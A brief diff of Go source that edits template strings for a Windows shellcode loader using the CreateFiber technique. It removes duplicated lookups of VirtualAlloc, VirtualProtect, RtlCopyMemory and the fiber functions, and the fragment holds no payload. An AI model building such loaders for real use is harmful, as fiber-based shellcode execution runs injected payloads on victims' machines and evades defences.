@@ -28,15 +28,7 @@ const CreateFiberDlls = `
 	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
 `
 const CreateFiber = `
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-	VirtualProtect := kernel32.NewProc("VirtualProtect")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
-	CreateFiber := kernel32.NewProc("CreateFiber")
-	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
 
 	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()
 
